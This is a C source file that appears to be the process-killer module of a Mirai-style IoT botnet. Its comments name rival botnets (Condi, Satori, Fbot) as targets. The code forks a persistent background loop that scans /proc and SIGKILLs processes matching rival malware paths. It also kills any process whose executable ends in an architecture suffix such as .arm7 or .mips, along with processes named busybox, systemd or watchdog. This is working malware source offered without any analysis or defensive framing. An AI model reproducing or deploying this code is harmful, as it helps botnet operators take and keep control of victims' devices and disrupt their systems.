#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <string.h>
#include <errno.h>
#include <sys/stat.h>
#include <ctype.h>

#include "VVV/includes.h"
#include "VVV/killer.h"
#include "VVV/table.h"
#include "VVV/util.h"

int killer_pid = 0;

// killing condi v4 v4.2, satori, fbot
void killer_condi() {
    DIR *dir;
    struct dirent *entry;

    dir = opendir("/proc");
    if (dir == NULL) {
        #ifdef DEBUG
        perror("[killer] Failed to open directory /proc");
        #endif
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            int pid = atoi(entry->d_name);
            if (pid > 0) {
                char status_path[512];
                snprintf(status_path, sizeof(status_path), "/proc/%s/status", entry->d_name);

                FILE *status_file = fopen(status_path, "r");
                if (status_file != NULL) {
                    char line[256];
                    char process_name[256] = "";

                    while (fgets(line, sizeof(line), status_file) != NULL) {
                        if (strncmp(line, "Name:", 5) == 0) {
                            sscanf(line + 6, "%s", process_name);
                            break;
                        }
                    }

                    if (strcmp(process_name, "/bin/busybox") == 0 ||
                        strcmp(process_name, "/bin/systemd") == 0 ||
                        strcmp(process_name, "/usr/bin") == 0 ||
                        strcmp(process_name, "test") == 0 ||
                        strcmp(process_name, "/tmp/condi") == 0 ||
                        strcmp(process_name, "/tmp/zxcr9999") == 0 ||
                        strcmp(process_name, "/tmp/condinetwork") == 0 ||
                        strcmp(process_name, "/var/condibot") == 0 ||
                        strcmp(process_name, "/var/zxcr9999") == 0 ||
                        strcmp(process_name, "/var/CondiBot") == 0 ||
                        strcmp(process_name, "/var/condinet") == 0 ||
                        strcmp(process_name, "/bin/watchdog") == 0) {
                        #ifdef DEBUG
                        printf("[killer] Found process with name %s (PID: %d)\n", process_name, pid);
                        #endif

                        if (kill(pid, SIGKILL) == 0) {
                            #ifdef DEBUG
                            printf("[killer] Process killed successfully.\n");
                            #endif
                        } else {
                            #ifdef DEBUG
                            perror("[killer] Failed to kill process");
                            #endif
                        }

                        fclose(status_file);
                        break;
                    }

                    fclose(status_file);
                } else {
                    #ifdef DEBUG
                    perror("[killer] Failed to open status file");
                    #endif
                }
            }
        }
    }
    closedir(dir);
    sleep(5);
}

// killing most shit net
void killer_exe(void) {
    const char *extensions[] = {".x86", ".x86_64", ".arm", ".arm5", ".arm6", ".arm7", ".mips", ".mipsel", ".sh4", ".ppc"};
    const int num_extensions = sizeof(extensions) / sizeof(extensions[0]);

    while (1) {
        DIR *dir = opendir("/proc");
        struct dirent *entry;

        if (dir == NULL) {
            #ifdef DEBUG
            perror("Error opening /proc directory");
            #endif
            return;
        }

        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_DIR) {
                int pid = atoi(entry->d_name);
                if (pid != 0) {
                    char exe_path[1024];
                    snprintf(exe_path, sizeof(exe_path), "/proc/%d/exe", pid);

                    char target_path[1024];
                    ssize_t target_len = readlink(exe_path, target_path, sizeof(target_path) - 1);
                    if (target_len != -1) {
                        target_path[target_len] = '\0';

                        const char *extension = strrchr(target_path, '.');
                        if (extension != NULL) {
                            for (int i = 0; i < num_extensions; i++) {
                                if (strcmp(extension, extensions[i]) == 0) {
                                    kill(pid, SIGKILL);
                                    #ifdef DEBUG
                                    printf("[killer] Killed process with PID %d, Path %s\n", pid, target_path);
                                    #endif
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        }

        closedir(dir);
        sleep(5);
    }
}

void killer_kill(void) {
    if (killer_pid != 0)
        kill(killer_pid, 9);
}

void killer_init() {

    struct dirent *file = NULL;

    killer_pid = fork();

    if (killer_pid != 0)
        return;

    while (1) {
        pid_t pid = fork();

        if (pid == 0) {
            killer_exe();
            _exit(0);
        } else if (pid > 0) {
            killer_condi();
        } else {
            printf("[killer] Failed to create child process.\n");
        }

        sleep(10);
    }
}
